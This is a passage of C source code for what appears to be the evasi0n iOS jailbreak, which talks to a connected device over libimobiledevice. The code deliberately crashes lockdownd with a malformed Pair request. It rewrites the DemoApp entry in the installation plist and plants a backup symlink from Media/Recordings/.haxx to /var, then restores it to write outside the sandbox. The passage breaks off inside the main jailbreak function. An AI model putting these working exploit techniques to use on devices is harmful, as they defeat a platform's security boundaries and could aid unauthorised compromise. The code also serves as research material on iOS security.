#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <errno.h>
#include <time.h>

#include <zlib.h>

#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/file_relay.h>
#include <libimobiledevice/sbservices.h>
#include <libimobiledevice/diagnostics_relay.h>
#include <libimobiledevice/afc.h>
#include <plist/plist.h>

#include "jailbreak.h"
#include "cpio.h"
#include "idevicebackup2.h"
#include "file.h"
#include "backup.h"
#include "backup_file.h"
#include "endianness.h"
#include "resources.h"
#include "build_supported.h"
#include "localize.h"

#include "LzmaDec.h"

#if defined(WIN32)
#include <windows.h>
#define sleep(x) Sleep(x*1000)
#elif defined(__APPLE__)
#include <mach-o/getsect.h>
#include <mach-o/dyld.h>
#else
extern unsigned char _binary_Cydia_tar_lzma_start[];
extern void* _binary_Cydia_tar_lzma_size;
extern unsigned char _binary_packagelist_tar_lzma_start[];
extern void* _binary_packagelist_tar_lzma_size;
#endif

static int device_connected = 0;
static int quit_flag = 0;

static status_cb_t status_cb_func = NULL;

static void errmsg(const char* msg, ...)
{
	char msgbuf[256];
	strcpy(msgbuf, "ERROR: ");

	va_list va;
	va_start(va, msg);
	if (status_cb_func) {
		vsnprintf(msgbuf+7, 248, msg, va);
		status_cb_func(msgbuf, 0, 1);
	} else {
		vsnprintf(msgbuf+7, 248, msg, va);
		fprintf(stderr, "%s\n", msgbuf);
	}
	va_end(va);
}

static void progress_msg(int progress, const char* msg, ...)
{
	char msgbuf[256];

	va_list va;
	va_start(va, msg);
	if (status_cb_func) {
		if (msg) {
			vsnprintf(msgbuf, 256, msg, va);
			status_cb_func(msgbuf, progress, 0);
		} else {
			status_cb_func(NULL, progress, 0);
		}
	} else {
		if (msg) {
			vsnprintf(msgbuf, 256, msg, va);
			printf("[%d%%] %s\n", progress, msgbuf);
		} else {
			printf("[%d%%]\n", progress);
		}
	}
	va_end(va);
}

static void request_user_attention(int level)
{
	if (status_cb_func) {
		status_cb_func(NULL, -1, level);
	}
}

static void cancel_user_attention()
{
	if (status_cb_func) {
		status_cb_func(NULL, -1, 0);
	}
}

void jb_device_event_cb(const idevice_event_t *event, void* userdata)
{
	char* udid = (char*)userdata;
	if (udid && strcmp(udid, event->udid)) return;
	if (event->event == IDEVICE_DEVICE_ADD) {
		device_connected = 1;
	} else if (event->event == IDEVICE_DEVICE_REMOVE) {
		device_connected = 0;
	}
}

void jb_signal_handler(int sig)
{
	quit_flag++;
	idevicebackup2_set_clean_exit(quit_flag);
}

int jb_device_is_supported(const char* ptype, const char* bver)
{
	int i = 0;
	while (build_supported[i].buildVersion) {
		if (strcmp(build_supported[i].buildVersion, bver) == 0) {
			return build_supported[i].supported;
		}
		i++;
	}
	return 0;
}

// reboot device
// returns 0 on success, or negative on error
static int reboot_device(const char* udid) /*{{{*/
{
	idevice_t device = NULL;
	if (idevice_new(&device, udid) != IDEVICE_E_SUCCESS) {
		fprintf(stderr, "%s: ERROR: Could not connect to device. Cannot reboot.\n", udid);
		return -3;
	}

	lockdownd_client_t lockdown = NULL;
	lockdownd_client_new_with_handshake(device, &lockdown, NULL);
	if (!lockdown) {
		idevice_free(device);
		device = NULL;
		return -1;
	}

	uint16_t port = 0;
	lockdownd_start_service(lockdown, "com.apple.mobile.diagnostics_relay", &port);
	lockdownd_client_free(lockdown);
	if (port == 0) {
		fprintf(stderr, "ERROR: Could not start diagnostics_relay service!\n");
		idevice_free(device);
		device = NULL;
		return -1;
	}

	diagnostics_relay_client_t diagc = NULL;
	if (diagnostics_relay_client_new(device, port, &diagc) != DIAGNOSTICS_RELAY_E_SUCCESS) {
		fprintf(stderr, "ERROR: Could not connect to diagnostics_relay!\n");
		idevice_free(device);
		device = NULL;
		return -1;
	}

	int result = 0;
	if (diagnostics_relay_restart(diagc, 0) != DIAGNOSTICS_RELAY_E_SUCCESS) {
		fprintf(stderr, "ERROR: Could not perform Restart command\n");
		result = -1;
	}

	diagnostics_relay_goodbye(diagc);
	diagnostics_relay_client_free(diagc);

	idevice_free(device);

	return result;
} /*}}}*/

// wait for passcode entry in case device is locked (no action if unlocked)
// returns 0 on success (or device was unlocked), -1 on error
static int wait_for_passcode(const char* udid) /*{{{*/
{
	idevice_t device = NULL;
	idevice_new(&device, udid);
	if (!device) {
		errmsg(localize("Could not connect to device?!"));
		return -1;
	}
	lockdownd_client_t lockdown = NULL;
	lockdownd_error_t lerr = lockdownd_client_new_with_handshake(device, &lockdown, NULL);
	if (lerr != LOCKDOWN_E_SUCCESS) {
		errmsg("Could not connect to lockdown (%d)", lerr);
		idevice_free(device);
		return -1;
	}

	uint8_t passcode = 0;
	int notified = 0;
	do {
		plist_t pp = NULL;
		if (lockdownd_get_value(lockdown, NULL, "PasswordProtected", &pp) != LOCKDOWN_E_SUCCESS) {
			fprintf(stderr, "hm could not get PasswordProtected value, assuming device is unlocked\n");
			break;
		}
		if (plist_get_node_type(pp) != PLIST_BOOLEAN) {
			plist_free(pp);
			fprintf(stderr, "hm PasswordProtected value is not of type boolean, assuming device is unlocked\n");
			break;
		}
		plist_get_bool_val(pp, &passcode);
		plist_free(pp);
		if (passcode) {
			if (!notified) {
				progress_msg(-1, localize("Device is locked with a passcode. Please enter it NOW; the procedure will then continue."));
				notified = 1;
			}
		}
		sleep(1);
	} while (passcode);

	if (notified) {
		progress_msg(-1, localize("Continuing..."));
	}

	lockdownd_client_free(lockdown);
	idevice_free(device);
	return 0;
} /*}}}*/

// crash lockdownd
static int crash_lockdown(const char* udid) /*{{{*/
{
	idevice_t device = NULL;
	idevice_new(&device, udid);

	idevice_connection_t conn = NULL;
	if (idevice_connect(device, 0xf27e, &conn) != IDEVICE_E_SUCCESS) {
		fprintf(stderr, "ERROR: could not connect to lockdownd\n");
		idevice_free(device);
		return -1;
	}

	plist_t crashme = plist_new_dict();
	plist_dict_insert_item(crashme, "Request", plist_new_string("Pair"));
	plist_dict_insert_item(crashme, "PairRecord", plist_new_bool(0));

	char* cxml = NULL;
	uint32_t clen = 0;

	plist_to_xml(crashme, &cxml, &clen);
	plist_free(crashme);
	crashme = NULL;

	uint32_t bytes = 0;
	uint32_t nlen = htobe32(clen);
	idevice_connection_send(conn, (const char*)&nlen, 4, &bytes);
	idevice_connection_send(conn, cxml, clen, &bytes);
	free(cxml);

	int failed = 0;
	bytes = 0;
	clen = 0;
	cxml = NULL;
	idevice_connection_receive_timeout(conn, (char*)&clen, 4, &bytes, 1500);
	nlen = be32toh(clen);
	if (nlen > 0) {
		cxml = malloc(nlen);
		idevice_connection_receive_timeout(conn, cxml, nlen, &bytes, 5000);
		free(cxml);
		if (bytes > 0) {
			failed = 1;
		}
	}
	idevice_disconnect(conn);
	if (failed) {
		fprintf(stderr, "ERROR: could not stroke lockdownd");
		idevice_free(device);
		return -1;
	}
	return 0;
} /*}}}*/

// wait for springboard to load
// returns 0 on timeout, other negative values on unrecoverable errors,
//  1 on success
static int device_wait_for_bootup(const char* udid) /*{{{*/
{
	idevice_t device = NULL;
	idevice_new(&device, udid);
	if (!device) {
		fprintf(stderr, "ERROR: Could not connect to device. Aborting.\n");
		return -2;
	}

	lockdownd_client_t lockdown = NULL;
	lockdownd_client_new_with_handshake(device, &lockdown, NULL);
	if (!lockdown) {
		idevice_free(device);
		fprintf(stderr, "ERROR: Could not connect to lockdown. Aborting\n");
		return -4;
	}

	int retries = 300;
	int done = 0;
	uint16_t port = 0;
	sbservices_client_t sbsc = NULL;
	plist_t state = NULL;

	while (!done && (retries-- > 0)) {
		port = 0;
		lockdownd_start_service(lockdown, "com.apple.springboardservices", &port);
		if (!port) {
			continue;
		}
		sbsc = NULL;
		sbservices_client_new(device, port, &sbsc);
		if (!sbsc) {
			continue;
		}
		if (sbservices_get_icon_state(sbsc, &state, "2") == SBSERVICES_E_SUCCESS) {
			plist_free(state);
			state = NULL;
			done = 1;
		}
		sbservices_client_free(sbsc);
		if (done) {
			break;
		}
		sleep(3);
	}
	lockdownd_client_free(lockdown);
	lockdown = NULL;

	return done;
} /*}}}*/

/* get our temporary working directory */
static void get_tmpdir(char* pathout) /*{{{*/
{
        pathout[0] = '\0';
#ifdef WIN32
        GetTempPathA(512, pathout);
#else
        strcpy(pathout, P_tmpdir);
#endif
        if (pathout[strlen(pathout)-1] != '/') {
                strcat(pathout, "/");
        }
        strcat(pathout, "evasi0n/");
} /*}}}*/

/* recursively remove path, including path */
static void rmdir_recursive(const char *path) /*{{{*/
{
	if (!path) {
		return;
	}
	DIR* cur_dir = opendir(path);
	if (cur_dir) {
		struct dirent* ep;
		while ((ep = readdir(cur_dir))) {
			if ((strcmp(ep->d_name, ".") == 0) || (strcmp(ep->d_name, "..") == 0)) {
				continue;
			}
			char *fpath = (char*)malloc(strlen(path)+1+strlen(ep->d_name)+1);
			if (fpath) {
				struct stat st;
				strcpy(fpath, path);
				strcat(fpath, "/");
				strcat(fpath, ep->d_name);

				if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
					rmdir_recursive(fpath);
				} else {
					if (remove(fpath) != 0) {
						fprintf(stderr, "could not remove file %s: %s\n", fpath, strerror(errno));
					}
				}
				free(fpath);
			}
		}
		closedir(cur_dir);
	}
	if (rmdir(path) != 0) {
		if (errno != ENOENT) {
			fprintf(stderr, "could not remove directory %s: %s\n", path, strerror(errno));
		}
	}
} /*}}}*/

/* char** freeing helper function */
static void free_dictionary(char **dictionary) /*{{{*/
{
	int i = 0;

	if (!dictionary)
		return;

	for (i = 0; dictionary[i]; i++) {
		free(dictionary[i]);
	}
	free(dictionary);
} /*}}}*/

static int num_csstores = 0;
int csstores[16];

/* retrieve com.apple.mobile.installation.plist using file_relay service */
static plist_t fetch_installation_plist(idevice_t device) /*{{{*/
{
	plist_t plist = NULL;
	lockdownd_client_t lockdown = NULL;
	file_relay_client_t frc = NULL;
	static char misplistpath[] = "./var/mobile/Library/Caches/com.apple.mobile.installation.plist";
	static char csstorepprefix[] = "./var/mobile/Library/Caches/com.apple.LaunchServices-";

	char path[512];
	get_tmpdir(path);
	strcat(path, "dump");

	num_csstores = 0;

	FILE *f = fopen(path, "wb");
	if (!f) {
		fprintf(stderr, "Could not open '%s' for writing\n", path);
		return NULL;
	}
	if (lockdownd_client_new_with_handshake(device, &lockdown, NULL) != LOCKDOWN_E_SUCCESS) {
		fprintf(stderr, "Could not connect to lockdownd\n");
		return NULL;
	}

	uint16_t port = 0;
	if (lockdownd_start_service(lockdown, "com.apple.mobile.file_relay", &port) != LOCKDOWN_E_SUCCESS) {
		printf("could not start file_relay service!\n");
		goto leave_cleanup;
	}

	if (lockdown) {
		lockdownd_client_free(lockdown);
		lockdown = NULL;
	}

	if (file_relay_client_new(device, port, &frc) != FILE_RELAY_E_SUCCESS) {
		printf("could not connect to file_relay service!\n");
		goto leave_cleanup;
	}

	idevice_connection_t dump = NULL;
	const char *sources[] = { "Caches", NULL };
	if (file_relay_request_sources(frc, sources, &dump) != FILE_RELAY_E_SUCCESS) {
		printf("could not get sources\n");
		goto leave_cleanup;
	}
	if (!dump) {
		printf("did not get connection!\n");
		goto leave_cleanup;
	}

	uint32_t cnt = 0;
	uint32_t len = 0;
	char buf[16384];
	while (idevice_connection_receive(dump, buf, 16384, &len) == IDEVICE_E_SUCCESS) {
		fwrite(buf, 1, len, f);
		cnt += len;
		len = 0;
	}
	fclose(f);
	if (cnt > 0) {
		gzFile zf = gzopen(path, "rb");
		if (!zf) {
			fprintf(stderr, "Huh? Could not open %s for reading?\n", path);
			goto leave_cleanup;
		}

		char fname[512];
		unsigned int ns;
		unsigned int fs;
		while (1) {
			// read cpio record header
			cpio_record_t cpiorec;
			if (gzread(zf, &cpiorec, sizeof(cpio_record_t)) < sizeof(cpio_record_t)) {
				break;
			}
			if (memcmp(cpiorec.magic, "070707", 6) != 0) {
				break;
			}
			ns = cpio_get_namesize(&cpiorec);
			if (ns == 0) {
				fprintf(stderr, "zero length filename?!\n");
				break;
			}
			if (gzread(zf, &fname, ns) != ns) {
				fprintf(stderr, "could not read filename?!\n");
				break;
			}
			fs = cpio_get_filesize(&cpiorec);
			if (strcmp(fname, misplistpath) == 0) {
				char* pbuf = malloc(fs);
				int tlen = 0;
				int len = 0;
				do {
					len = 8192;
					if ((tlen + 8192) > fs) {
						len = fs - tlen;
					}
					len = gzread(zf, pbuf+tlen, len);
					if (len <= 0) {
						break;
					}
					tlen += len;
				} while (tlen < fs);
				if (tlen == fs) {
					if (memcmp(pbuf, "bplist00", 8) == 0) {
						plist_from_bin(pbuf, fs, &plist);
					} else {
						plist_from_xml(pbuf, fs, &plist);
					}
				}
				free(pbuf);
			} else if (strncmp(fname, csstorepprefix, strlen(csstorepprefix)) == 0) {
				if (num_csstores < 16) {
					csstores[num_csstores++] = strtol(fname + strlen(csstorepprefix), NULL, 10);
				} else {
					fprintf(stderr, "This is weird. More than 16 .csstore files?!\n");
				}
				gzseek(zf, fs, SEEK_CUR);
			} else if (fs > 0) {
				gzseek(zf, fs, SEEK_CUR);
			}
		}
		gzclose(zf);
	}

leave_cleanup:
	if (frc) {
		file_relay_client_free(frc);
	}
	if (lockdown) {
		lockdownd_client_free(lockdown);
	}
	// we default to *-045.csstore if we didn't find it.
	if (num_csstores == 0) {
		csstores[num_csstores++] = 45;
	}

	return plist;
} /*}}}*/

static void __plist_dict_set_item(plist_t dict, const char* key, plist_t value)
{
	plist_t node = plist_dict_get_item(dict, key);
	if (node) {
		plist_dict_remove_item(dict, key);
	}
	plist_dict_insert_item(dict, key, value);
}

/* modify com.apple.mobile.installation.plist */
static int modify_installation_plist(plist_t *plist) /*{{{*/
{
	if (!plist || !*plist) {
		return -1;
	}

	plist_t demoapp = plist_access_path(*plist, 2, "System", "com.apple.DemoApp");
	if (!demoapp) {
		fprintf(stderr, "could not find com.apple.DemoApp entry in plist\n");
		return -1;
	}

	plist_dict_remove_item(demoapp, "ApplicationType");
	plist_dict_remove_item(demoapp, "SBAppTags");

	__plist_dict_set_item(demoapp, "Path", plist_new_string("/var/mobile/DemoApp.app"));

	plist_t dict = plist_new_dict();
	plist_dict_insert_item(dict, "LAUNCHD_SOCKET", plist_new_string("/private/var/tmp/launchd/sock"));
	__plist_dict_set_item(demoapp, "EnvironmentVariables", dict);

	return 0;
} /*}}}*/

static int plist_write_to_file(plist_t plist, const char* path, int binary) /*{{{*/
{
	int res = 0;
	char* pldata = NULL;
	uint32_t plsize = 0;
	if (binary) {
		plist_to_bin(plist, &pldata, &plsize);
	} else {
		plist_to_xml(plist, &pldata, &plsize);
	}
	if (!pldata || !plsize) {
		fprintf(stderr, "Couldn't convert plist to %s?!\n", (binary) ? "binary" : "XML");
		res = -1;
	} else {
		if (file_write(path, (unsigned char*)pldata, plsize) < 0) {
			fprintf(stderr, "Couldn't write plist to %s\n", path);
			res = -1;
		}
	}
	if (pldata) {
		free(pldata);
	}
	return res;
} /*}}}*/

static int get_rand(int min, int max) /*{{{*/
{
	int retval = (rand() % (max - min)) + min;
	return retval;
} /*}}}*/

static char* gen_uuid() /*{{{*/
{
	char *uuid = (char *) malloc(sizeof(char) * 37);
	const char *chars = "ABCDEF0123456789";
	srand(time(NULL));
	int i = 0;

	for (i = 0; i < 36; i++) {
		if (i == 8 || i == 13 || i == 18 || i == 23) {
			uuid[i] = '-';
			continue;
		} else {
			uuid[i] = chars[get_rand(0, 16)];
		}
	}
	/* make it a real string */
	uuid[36] = '\0';
	return uuid;
} /*}}}*/

static int inode = 54327; // this is just random.

static int backup_add_file_with_data(backup_t *backup, const char* domain, const char* path, int mode, int uid, int gid, int flag, const unsigned char* data, int data_size) /*{{{*/
{
	int res = -1;
	backup_file_t* bf = backup_file_create(NULL);
	if (bf) {
		backup_file_set_domain(bf, domain);
                backup_file_set_path(bf, path);
                backup_file_set_mode(bf, 0100000 | mode);
                backup_file_set_inode(bf, inode++);
                backup_file_set_uid(bf, uid);
                backup_file_set_gid(bf, gid);
                unsigned int tm = (unsigned int)(time(NULL));
                backup_file_set_time1(bf, tm);
                backup_file_set_time2(bf, tm);
                backup_file_set_time3(bf, tm);
                backup_file_set_flag(bf, flag);

		backup_file_assign_file_data(bf, (unsigned char*)data, data_size, 0);
		backup_file_set_length(bf, data_size);
                if (backup_update_file(backup, bf) < 0) {
			res = -1;
                } else {
			res = 0;
		}
                backup_file_free(bf);
	}
	return res;
} /*}}}*/

static int backup_add_directory(backup_t *backup, const char* domain, const char* path, int mode, int uid, int gid) /*{{{*/
{
	int res = -1;
	backup_file_t* bf = backup_file_create(NULL);
	if (bf) {
		backup_file_set_domain(bf, domain);
	        backup_file_set_path(bf, path);
                backup_file_set_mode(bf, 0040000 | mode);
                backup_file_set_inode(bf, inode++);
                backup_file_set_uid(bf, uid);
                backup_file_set_gid(bf, gid);
                unsigned int tm = (unsigned int)(time(NULL));
                backup_file_set_time1(bf, tm);
                backup_file_set_time2(bf, tm);
                backup_file_set_time3(bf, tm);
                backup_file_set_flag(bf, 0);

                if (backup_update_file(backup, bf) < 0) {
			res = -1;
                } else {
			res = 0;
		}
                backup_file_free(bf);
	}
	return res;
} /*}}}*/

static int backup_add_symlink(backup_t *backup, const char* domain, const char* path, const char* target, int uid, int gid) /*{{{*/
{
	int res = -1;
	backup_file_t* bf = backup_file_create(NULL);
        if (bf) {
                backup_file_set_domain(bf, domain);
                backup_file_set_path(bf, path);
                backup_file_set_target(bf, target);
                backup_file_set_mode(bf, 0120644);
                backup_file_set_inode(bf, inode++);
                backup_file_set_uid(bf, uid);
                backup_file_set_gid(bf, gid);
                unsigned int tm = (unsigned int)(time(NULL));
                backup_file_set_time1(bf, tm);
                backup_file_set_time2(bf, tm);
                backup_file_set_time3(bf, tm);
                backup_file_set_flag(bf, 0);

                if (backup_update_file(backup, bf) < 0) {
			res = -1;
                } else {
			res = 0;
		}
                backup_file_free(bf);
        }
	return res;
} /*}}}*/

static int trash_var_backup(const char* path, const char* udid) /*{{{*/
{
	int res = 0;
	char dstf[512];

	strcpy(dstf, path);
	strcat(dstf, "/");
	strcat(dstf, udid);
	strcat(dstf, "/Manifest.mbdb");

	if (file_write(dstf, (unsigned char*)"mbdb\5\0", 6) < 0) {
		fprintf(stderr, "Could not write file '%s'!\n", dstf);
		return -1;
	}

	backup_t* backup = backup_open(path, udid);
	if (!backup) {
		fprintf(stderr, "ERROR: could not open backup\n");
		return -1;
	}

	if (backup_add_directory(backup, "MediaDomain", "Media", 0755, 501, 501) < 0) {
		fprintf(stderr, "Couldn't add dir to backup\n");
		return -1;
	}
	if (backup_add_directory(backup, "MediaDomain", "Media/Recordings", 0755, 501, 501) < 0) {
		fprintf(stderr, "Couldn't add dir to backup\n");
		return -1;
	}

	// *** magic symlink
	if (backup_add_symlink(backup, "MediaDomain", "Media/Recordings/.haxx", "/var", 501, 501) < 0) {
		fprintf(stderr, "Couldn't add file to backup\n");
		return -1;
	}

	// we add this so the device doesn't restore any weird stuff.
	backup_file_t* bf = backup_file_create(NULL);
        if (bf) {
                backup_file_set_domain(bf, "MediaDomain");
                backup_file_set_path(bf, "Media/Recordings/.haxx/backup");
                backup_file_set_target_with_length(bf, "\0", 1);
                backup_file_set_mode(bf, 0120644);
                backup_file_set_inode(bf, inode++);
                backup_file_set_uid(bf, 0);
                backup_file_set_gid(bf, 0);
                unsigned int tm = (unsigned int)(time(NULL));
                backup_file_set_time1(bf, tm);
                backup_file_set_time2(bf, tm);
                backup_file_set_time3(bf, tm);
                backup_file_set_flag(bf, 0);

                if (backup_update_file(backup, bf) < 0) {
			res = -1;
                } else {
			res = 0;
		}
                backup_file_free(bf);
        }
	if (res < 0) {
		fprintf(stderr, "Error: Couldn't add file to backup!\n");
		return -1;
	}

	// *** save backup ***
	backup_write_mbdb(backup);
	backup_free(backup);

	if (wait_for_passcode(udid) < 0) {
		return -1;
	}
	char* rargv[] = {
		"idevicebackup2",
		"--udid",
		(char*)udid,
		"restore",
		"--system",
		"--settings",
		(char*)path,
		NULL
	};
	int rargc = 7;
	idevicebackup2_set_ignore_error(102);
	res = idevicebackup2(rargc, rargv);
	if (res != 0) {
		printf("hmm... restore failed %d?!\n", res);
		return res;
	}

	return res;
} /*}}}*/

struct afc_upload_callback_context
{
    float start_percentage;
    float stop_percentage;
};

void afc_default_upload_callback(void* context, size_t bytes, size_t total)
{
    struct afc_upload_callback_context* callback_context = (struct afc_upload_callback_context*) context;
    progress_msg((int)(callback_context->start_percentage + ((callback_context->stop_percentage - callback_context->start_percentage) * ((float)bytes / (float)total))), NULL);
}

int afc_upload_file(afc_client_t afc, const char* filename, const char* dstfn, void (*callback)(void* context, size_t bytes, size_t total), void* context)
{
    uint64_t handle = 0;
    char data[0x1000];

    FILE* infile = fopen(filename, "rb");
    if(!infile)
        return -1;

    struct stat stat_buf;
    if(fstat(fileno(infile), &stat_buf) != 0)
    {
        fclose(infile);
        return -1;
    }

    afc_error_t err = afc_file_open(afc, dstfn, AFC_FOPEN_WR, &handle);
    if(err != AFC_E_SUCCESS)
        return -1;

    int res = 0;
    size_t cur = 0;
    size_t total = stat_buf.st_size;
    callback(context, 0, total);

    while(!feof(infile))
    {
        uint32_t bytes_read = fread(data, 1, sizeof(data), infile);
        uint32_t bytes_written = 0;
        if(afc_file_write(afc, handle, data, bytes_read, &bytes_written) != AFC_E_SUCCESS)
        {
            res = -1;
            callback(context, -1, total);
            break;
        }
        cur += bytes_written;
        callback(context, cur, total);
    }
    afc_file_close(afc, handle);
    fclose(infile);

    return res;
}

int afc_upload_data(afc_client_t afc, const char* filename, const void* data, size_t bytes, void (*callback)(void* context, size_t bytes, size_t total), void* context)
{
    uint64_t handle = 0;
    afc_error_t err = afc_file_open(afc, filename, AFC_FOPEN_WR, &handle);
    if(err != AFC_E_SUCCESS)
        return -1;

    int res = 0;
    size_t cur = 0;
    size_t total = bytes;
    callback(context, 0, total);

    while(bytes > 0)
    {
        uint32_t bytes_to_write = bytes > 0x1000 ? 0x1000 : bytes;
        uint32_t bytes_written = 0;
        if(afc_file_write(afc, handle, data, bytes_to_write, &bytes_written) != AFC_E_SUCCESS)
        {
            res = -1;
            callback(context, -1, total);
            break;
        }

        cur += bytes_written;
        data += bytes_written;
        bytes -= bytes_written;
        callback(context, cur, total);
    }

    afc_file_close(afc, handle);

    return res;
}

#if 0
void* get_data_from_file(const char* filename, size_t* size)
{
    FILE* infile = fopen(filename, "rb");
    if(!infile)
        return NULL;

    struct stat stat_buf;
    if(fstat(fileno(infile), &stat_buf) != 0)
    {
        fclose(infile);
        return NULL;
    }

    *size = stat_buf.st_size;

    void* buffer = malloc(stat_buf.st_size);
    fread(buffer, 1, stat_buf.st_size, infile);
    fclose(infile);
    return buffer;
}

void* get_compressed_cydia_data(size_t* size)
{
    return get_data_from_file("Cydia.tar.lzma", size);
}

void* get_compressed_packagelist_data(size_t* size)
{
    return get_data_from_file("packagelist.tar.lzma", size);
}
#endif

size_t compressed_data_size(const void* compressed_data, size_t compressed_size)
{
    if(compressed_size < (LZMA_PROPS_SIZE + sizeof(uint64_t)))
        return 0;

    uint64_t le_size = *(const uint64_t*)(((const uint8_t*)compressed_data) + LZMA_PROPS_SIZE);
    return (size_t) le64toh(le_size);
}

static void *SzAlloc(void *p, size_t size) { p = p; return malloc(size); }
static void SzFree(void *p, void *address) { p = p; free(address); }
static ISzAlloc g_Alloc = { SzAlloc, SzFree };

int afc_upload_compressed_data(afc_client_t afc, const char* filename, const void* compressed_data, size_t compressed_size, void (*callback)(void* context, size_t bytes, size_t total), void* context)
{
    uint64_t handle = 0;
    afc_error_t err = afc_file_open(afc, filename, AFC_FOPEN_WR, &handle);
    if(err != AFC_E_SUCCESS)
        return -1;

    size_t total = compressed_data_size(compressed_data, compressed_size);

    uint8_t header[LZMA_PROPS_SIZE + sizeof(uint64_t)];
    memcpy(header, compressed_data, LZMA_PROPS_SIZE);
    memset(header + LZMA_PROPS_SIZE, 0xFF, sizeof(uint64_t));

    CLzmaDec state;
    LzmaDec_Construct(&state);

    if(LzmaDec_Allocate(&state, header, LZMA_PROPS_SIZE, &g_Alloc) != SZ_OK)
    {
        afc_file_close(afc, handle);
        return -1;
    }

    compressed_data += LZMA_PROPS_SIZE + sizeof(uint64_t);
    compressed_size -= LZMA_PROPS_SIZE + sizeof(uint64_t);

    int res = 0;
    size_t cur = 0;
    size_t left = total;
    callback(context, 0, total);

    LzmaDec_Init(&state);

    while(left > 0)
    {
        uint8_t buffer[0x1000];
        uint32_t bytes_to_write = left > 0x1000 ? 0x1000 : left;
        uint32_t bytes_to_decompress = bytes_to_write;

        uint8_t* data = buffer;
        while(bytes_to_decompress > 0)
        {
            size_t in = compressed_size;
            size_t out = bytes_to_decompress;
            ELzmaStatus status;
            if(LzmaDec_DecodeToBuf(&state, data, &out, compressed_data, &in, LZMA_FINISH_ANY, &status) != SZ_OK)
            {
                res = -1;
                callback(context, -1, total);
                break;
            }

            data += out;
            bytes_to_decompress -= out;
            compressed_data += in;
            compressed_size -= in;
        }

        if(res == -1)
            break;

        data = buffer;
        while(bytes_to_write > 0)
        {
            uint32_t bytes_written = 0;
            if(afc_file_write(afc, handle, (char*) data, bytes_to_write, &bytes_written) != AFC_E_SUCCESS)
            {
                res = -1;
                callback(context, -1, total);
                break;
            }

            cur += bytes_written;
            data += bytes_written;
            left -= bytes_written;
            bytes_to_write -= bytes_written;
            callback(context, cur, total);
        }

        if(res == -1)
            break;
    }

    LzmaDec_Free(&state, &g_Alloc);
    afc_file_close(afc, handle);

    return res;
}

void* load_resource(const char* name, size_t* size)
{
	void* ptr = NULL;
#if defined(WIN32)
	HRSRC hres = FindResourceA(NULL, name, (LPCSTR)RT_RCDATA);
	if (hres) {
		HGLOBAL res = LoadResource(NULL, hres);
		ptr = LockResource(res);
		int dwSizeRes = SizeofResource(NULL, hres);
		*size = dwSizeRes;
	}
#elif defined(__APPLE__)
	unsigned long rsize = 0;
	ptr = (void*)getsectdata("__DATA", name, &rsize) + _dyld_get_image_vmaddr_slide(0);
	*size = rsize;
#else
	if (strcmp(name, "cydia") == 0) {
		ptr = _binary_Cydia_tar_lzma_start;
		*size = (size_t) &_binary_Cydia_tar_lzma_size;
	} else if (strcmp(name, "packagelist") == 0) {
		ptr = _binary_packagelist_tar_lzma_start;
		*size = (size_t) &_binary_packagelist_tar_lzma_size;
	} else {
		fprintf(stderr, "Invalid resource name '%s'\n", name);
	}
#endif
	return ptr;
}

void localize_demo_app(const void** data, size_t* size)
{
    plist_t plist = NULL;
    plist_from_bin((char*)demo_app_info_plist, sizeof(demo_app_info_plist), &plist);
    if(!plist || plist_get_node_type(plist) != PLIST_DICT)
    {
        *data = demo_app_info_plist;
        *size = sizeof(demo_app_info_plist);
    }

    __plist_dict_set_item(plist, "CFBundleDisplayName", plist_new_string(localize("Jailbreak")));

    char* plist_bin = NULL;
    uint32_t plist_size = 0;
    plist_to_bin(plist, &plist_bin, &plist_size);

    if(!plist_bin)
    {
        *data = demo_app_info_plist;
        *size = sizeof(demo_app_info_plist);
    }

    *data = plist_bin;
    *size = plist_size;
}

int jailbreak(const char* udid, status_cb_t status_cb)
{
	int res = -1;
	int retries;

	status_cb_func = status_cb;

	size_t cydia_compressed_size = 0;
	void* cydia_compressed_data = load_resource("cydia", &cydia_compressed_size);
	if (!cydia_compressed_data) {
		errmsg(localize("Cydia is missing from resources"));
		return -1;
	}
	size_t packagelist_compressed_size = 0;
	void* packagelist_compressed_data = load_resource("packagelist", &packagelist_compressed_size);
	if (!packagelist_compressed_data) {
		errmsg(localize("Packagelist is missing from resources"));
		return -1;
	}

	progress_msg(1, localize("Connecting to device..."));

	retries = 10;
	while (retries-- && !device_connected) {
		sleep(1);
	}
	if (!device_connected) {
		errmsg(localize("Could not find device in connected state?!"));
		return -1;
	}

	idevice_t device = NULL;
	idevice_new(&device, udid);
	if (!device) {
		errmsg(localize("Could not connect to device!"));
		return -1;
	}

	// get some device specific information
	plist_t pl_build = NULL;
	plist_t pl_devname = NULL;
	plist_t pl_ptype = NULL;
	plist_t pl_pver = NULL;
	plist_t pl_snum = NULL;
        plist_t pl_devtools = NULL;

	lockdownd_client_t lockdown = NULL;
	lockdownd_error_t lerr = lockdownd_client_new_with_handshake(device, &lockdown, NULL);
	if (lerr != LOCKDOWN_E_SUCCESS) {
		errmsg("Failed to connect to lockdownd (%d)", lerr);
		return -1;
	}

	lockdownd_get_value(lockdown, NULL, "BuildVersion", &pl_build);
	lockdownd_get_value(lockdown, NULL, "DeviceName", &pl_devname);
	lockdownd_get_value(lockdown, NULL, "ProductType", &pl_ptype);
	lockdownd_get_value(lockdown, NULL, "ProductVersion", &pl_pver);
	lockdownd_get_value(lockdown, NULL, "SerialNumber", &pl_snum);
	lockdownd_get_value(lockdown, "com.apple.mobile.internal", "DevToolsAvailable", &pl_devtools);

	lockdownd_client_free(lockdown);
	lockdown = NULL;

	if (!pl_build) {
		errmsg(localize("Failed to get BuildVersion from lockdown."));
		return -1;
	}
	if (!pl_devname) {
		errmsg(localize("Failed to get DeviceName from lockdown."));
		return -1;
	}
	if (!pl_ptype) {
		errmsg(localize("Failed to get ProductType from lockdown."));
		return -1;
	}
	if (!pl_pver) {
		errmsg(localize("Failed to get ProductVersion from lockdown."));
		return -1;
	}
	if (!pl_snum) {
		errmsg(localize("Failed to get SerialNumber from lockdown."));
		return -1;
	}

        int has_ddi = 0;
        if(pl_devtools && plist_get_node_type(pl_devtools) == PLIST_STRING)
        {
            char* val = NULL;
            plist_get_string_val(pl_devtools, &val);
            if(val)
            {
                if(strcmp(val, "None") == 0)
                {
                    has_ddi = 0;
                } else
                {
                    has_ddi = 1;
                }

                free(val);
            }
        }

        // DDI is mounted. We must reboot the device before we can continue.
        if(has_ddi)
        {
	    idevice_free(device);
